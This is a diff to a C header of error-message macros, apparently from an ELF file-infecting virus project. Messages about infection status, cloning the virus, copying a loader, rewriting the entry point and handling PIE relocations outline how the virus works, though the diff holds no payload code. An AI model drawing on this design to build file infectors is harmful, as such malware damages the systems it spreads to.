@@ -30,9 +30,6 @@
 /* ------------------------------- errors file ------------------------------ */
 
 #  define _ERR_F_CANT_READ_ELFHDR          PD_ARRAY(char,_err_text,'\033','[','3','3','m','c','a','n','t',' ','r','e','a','d',' ','e','l','f','h','d','r','\n','\033','[','0','m',0)
-#  define _ERR_F_NO_ENTRY_PHDR             PD_ARRAY(char,_err_text,'\033','[','3','3','m','c','o','u','l','d','n','\'','t',' ','f','i','n','d',' ','e','n','t','r','y',' ','p','h','d','r','\n','\033','[','0','m',0)
-#  define _ERR_F_NO_ENTRY_SHDR             PD_ARRAY(char,_err_text,'\033','[','3','3','m','c','o','u','l','d','n','\'','t',' ','f','i','n','d',' ','e','n','t','r','y',' ','s','h','d','r','\n','\033','[','0','m',0)
-#  define _ERR_F_NO_SECT_IN_ENTRY_SEG      PD_ARRAY(char,_err_text,'\033','[','3','3','m','n','o',' ','s','e','c','t',' ','i','n',' ','e','n','t','r','y','_','s','e','g','\n','\033','[','0','m',0)
 #  define _ERR_F_BAD_PHDR_OFF              PD_ARRAY(char,_err_text,'\033','[','3','3','m','b','a','d',' ','p','h','d','r',' ','o','f','f','\n','\033','[','0','m',0)
 #  define _ERR_F_BAD_SHDR_OFF              PD_ARRAY(char,_err_text,'\033','[','3','3','m','b','a','d',' ','s','h','d','r',' ','o','f','f','\n','\033','[','0','m',0)
 #  define _ERR_F_NO_ORIGINAL_FILE_BEGIN    PD_ARRAY(char,_err_text,'\033','[','3','3','m','n','o',' ','o','r','i','g','i','n','a','l',' ','f','i','l','e',' ','b','e','g','i','n','n','i','n','g','\n','\033','[','0','m',0)
@@ -65,7 +62,7 @@
 #  define _ERR_T_ADJUST_REFERENCES         PD_ARRAY(char,_err_text,'\033','[','3','3','m','a','d','j','u','s','t','_','r','e','f','e','r','e','n','c','e','s','\n','\033','[','0','m',0)
 #  define _ERR_T_NOT_INFECTED              PD_ARRAY(char,_err_text,'\033','[','3','3','m','n','o','t','_','i','n','f','e','c','t','e','d','\n','\033','[','0','m',0)
 #  define _ERR_T_NOT_INFECTED_JUMP         PD_ARRAY(char,_err_text,'\033','[','3','3','m','n','o','t','_','i','n','f','e','c','t','e','d','_','j','u','m','p','\n','\033','[','0','m',0)
-#  define _ERR_T_FIND_FIRST_JUMP32         PD_ARRAY(char,_err_text,'\033','[','3','3','m','f','i','n','d','_','f','i','r','s','t','_','j','u','m','p','\n','\033','[','0','m',0)
+#  define _ERR_T_FIND_FIRST_JMP32          PD_ARRAY(char,_err_text,'\033','[','3','3','m','f','i','n','d','_','f','i','r','s','t','_','j','u','m','p','\n','\033','[','0','m',0)
 #  define _ERR_T_CHANGE_CLIENT_JUMP        PD_ARRAY(char,_err_text,'\033','[','3','3','m','c','h','a','n','g','e','_','c','l','i','e','n','t','_','j','u','m','p','\n','\033','[','0','m',0)
 #  define _ERR_T_STEP_INSTRUCTION          PD_ARRAY(char,_err_text,'\033','[','3','3','m','s','t','e','p','_','i','n','s','t','r','u','c','t','i','o','n','\n','\033','[','0','m',0)
 #  define _ERR_T_ADJUST_JUMPS              PD_ARRAY(char,_err_text,'\033','[','3','3','m','a','d','j','u','s','t','_','j','u','m','p','s','\n','\033','[','0','m',0)
@@ -73,31 +70,33 @@
 #  define _ERR_T_CHANGE_ENTRY              PD_ARRAY(char,_err_text,'\033','[','3','3','m','c','h','a','n','g','e','_','e','n','t','r','y','\n','\033','[','0','m',0)
 #  define _ERR_T_GET_CLONE_VIRUS_ADDRESS   PD_ARRAY(char,_err_text,'\033','[','3','3','m','g','e','t','_','c','l','o','n','e','_','v','i','r','u','s','_','a','d','d','r','e','s','s','\n','\033','[','0','m',0)
 #  define _ERR_T_SPLIT_REF                 PD_ARRAY(char,_err_text,'\033','[','3','3','m','s','p','l','i','t','_','r','e','f','\n','\033','[','0','m',0)
+#  define _ERR_T_ADJUST_SHDR_VALUES        PD_ARRAY(char,_err_text,'\033','[','3','3','m','a','d','j','u','s','t','_','s','h','d','r','_','v','a','l','u','e','s','\n','\033','[','0','m',0)
 
 /* ------------------------------ errors virus ------------------------------ */
 
 #  define _ERR_V_ALREADY_INFECTED          PD_ARRAY(char,_err_text,'\033','[','3','2','m','a','l','r','e','a','d','y',' ','i','n','f','e','c','t','e','d',' ','<','3','\n','\033','[','0','m',0)
 #  define _ERR_V_CANT_READ_SIGNATURE       PD_ARRAY(char,_err_text,'\033','[','3','2','m','c','a','n','\'','t',' ','r','e','a','d',' ','s','i','g','n','a','t','u','r','e','\n','\033','[','0','m',0)
 #  define _ERR_V_CANT_READ_FULL_VIRUS      PD_ARRAY(char,_err_text,'\033','[','3','2','m','c','a','n','\'','t',' ','r','e','a','d',' ','f','u','l','l',' ','v','i','r','u','s','\n','\033','[','0','m',0)
-#  define _ERR_V_COPY_VIRUS_TO_CLONE       PD_ARRAY(char,_err_text,'\033','[','3','3','m','c','o','p','y','_','l','o','a','d','e','r','_','t','o','_','c','l','o','n','e','\n','\033','[','0','m',0)
 #  define _ERR_V_CANT_READ_LOADER          PD_ARRAY(char,_err_text,'\033','[','3','3','m','c','a','n','\'','t',' ','r','e','a','d',' ','l','o','a','d','e','r','\n','\033','[','0','m',0)
 #  define _ERR_V_CANT_READ_VIRUS           PD_ARRAY(char,_err_text,'\033','[','3','3','m','c','a','n','\'','t',' ','r','e','a','d',' ','v','i','r','u','s','\n','\033','[','0','m',0)
 #  define _ERR_V_CANT_READ_VIRCALL         PD_ARRAY(char,_err_text,'\033','[','3','3','m','c','a','n','\'','t',' ','r','e','a','d',' ','v','i','r','c','a','l','l','\n','\033','[','0','m',0)
 #  define _ERR_V_MAX_JUMP_TOO_SMALL        PD_ARRAY(char,_err_text,'\033','[','3','3','m','m','a','x',' ','j','u','m','p','s',' ','t','o','o',' ','s','m','a','l','l','\n','\033','[','0','m',0)
-#  define _ERR_V_OPERANDS_JUMP_TOO_SMALL   PD_ARRAY(char,_err_text,'\033','[','3','3','m','m','a','x',' ','o','p','e','r','a','n','d','s',' ','t','o','o',' ','s','m','a','l','l','\n','\033','[','0','m',0)
 #  define _ERR_V_INSTRUCTION_LENGTH        PD_ARRAY(char,_err_text,'\033','[','3','3','m','i','n','s','t','r','u','c','t','i','o','n',' ','l','e','n','g','t','h',' ','e','x','c','e','e','d','s',' ','c','o','d','e',' ','l','e','n','g','t','h','\n','\033','[','0','m',0)
 #  define _ERR_V_CANT_SPLIT_MORE           PD_ARRAY(char,_err_text,'\033','[','3','3','m','c','a','n','\'','t',' ','s','p','l','i','t',' ','m','o','r','e','\n','\033','[','0','m',0)
 #  define _ERR_V_NO_ENTRY_POINT            PD_ARRAY(char,_err_text,'\033','[','3','3','m','c','o','u','l','d','n','\'','t',' ','f','i','n','d',' ','e','n','t','r','y',' ','p','o','i','n','t','\n','\033','[','0','m',0)
 #  define _ERR_V_CANT_READ_BLOCK           PD_ARRAY(char,_err_text,'\033','[','3','3','m','c','a','n','\'','t',' ','r','e','a','d',' ','b','l','o','c','k','\n','\033','[','0','m',0)
-#  define _ERR_V_ADJUST_JUMPS              PD_ARRAY(char,_err_text,'\033','[','3','3','m','a','d','j','u','s','t',' ','j','u','m','p','s','\n','\033','[','0','m',0)
 #  define _ERR_V_ADD_TRAILING_JUMP         PD_ARRAY(char,_err_text,'\033','[','3','3','m','a','d','d',' ','t','r','a','i','l','i','n','g',' ','j','u','m','p','\n','\033','[','0','m',0)
 #  define _ERR_V_BAD_TRAILING_JUMP         PD_ARRAY(char,_err_text,'\033','[','3','3','m','t','r','a','i','l','i','n','g',' ','j','u','m','p',' ','v','a','l','u','e',' ','d','o','e','s','n','\'','t',' ','m','a','t','c','h',' ','d','e','s','t','i','n','a','t','i','o','n','\n','\033','[','0','m',0)
-#  define _ERR_V_NOT_ENOUGH_PADDING        PD_ARRAY(char,_err_text,'\033','[','3','3','m','n','o','t',' ','e','n','o','u','g','h',' ','p','a','d','d','i','n','g','\n','\033','[','0','m',0)
 #  define _ERR_V_CANT_READ_CONSTANTS       PD_ARRAY(char,_err_text,'\033','[','3','3','m','c','a','n','\'','t',' ','r','e','a','d',' ','c','o','n','s','t','a','n','t','s','\n','\033','[','0','m',0)
 #  define _ERR_V_NOT_NEIGHBORS             PD_ARRAY(char,_err_text,'\033','[','3','3','m','i','n','s','t',' ','n','o','t',' ','n','e','i','g','h','b','o','u','r','s','\n','\033','[','0','m',0)
 #  define _ERR_V_CANT_READ_LOADER_CODE     PD_ARRAY(char,_err_text,'\033','[','3','3','m','c','a','n','\'','t',' ','a','c','c','e','s','s',' ','l','o','a','d','e','r',' ','c','o','d','e','\n','\033','[','0','m',0)
 #  define _ERR_V_CANT_READ_JUMP            PD_ARRAY(char,_err_text,'\033','[','3','3','m','c','a','n','\'','t',' ','r','e','a','d',' ','j','u','m','p','\n','\033','[','0','m',0)
 #  define _ERR_V_MISSING_FILE_FIELDS       PD_ARRAY(char,_err_text,'\033','[','3','3','m','c','a','n','\'','t',' ','f','i','n','d',' ','m','a','n','d','a','t','o','r','y',' ','f','i','l','e',' ','i','n','f','o','r','m','a','t','i','o','n','s','\n','\033','[','0','m',0)
+#  define _ERR_V_IS_NOT_PIE                PD_ARRAY(char,_err_text,'\033','[','3','3','m','t','a','r','g','e','t',' ','i','s',' ','n','o','t',' ','p','o','s','i','t','i','o','n',' ','i','n','d','e','p','e','n','d','e','n','t','\n','\033','[','0','m',0)
+#  define _ERR_V_CANT_READ_RELOCATION      PD_ARRAY(char,_err_text,'\033','[','3','3','m','c','a','n','\'','t',' ','r','e','a','d',' ','r','e','l','o','c','a','t','i','o','n',' ','f','i','e','l','d','\n','\033','[','0','m',0)
+#  define _ERR_V_CANT_READ_DYNAMIC         PD_ARRAY(char,_err_text,'\033','[','3','3','m','c','a','n','\'','t',' ','r','e','a','d',' ','d','y','n','a','m','i','c',' ','f','i','e','l','d','\n','\033','[','0','m',0)
+#  define _ERR_V_CANT_READ_DYNAMIC_SYM     PD_ARRAY(char,_err_text,'\033','[','3','3','m','c','a','n','\'','t',' ','r','e','a','d',' ','d','y','n','a','m','i','c',' ','s','y','m',' ','f','i','e','l','d','\n','\033','[','0','m',0)
+#  define _ERR_V_CANT_READ_RELA            PD_ARRAY(char,_err_text,'\033','[','3','3','m','c','a','n','\'','t',' ','r','e','a','d',' ','r','e','l','a',' ','f','i','e','l','d','\n','\033','[','0','m',0)
 
 /* -------------------------------------------------------------------------- */
 
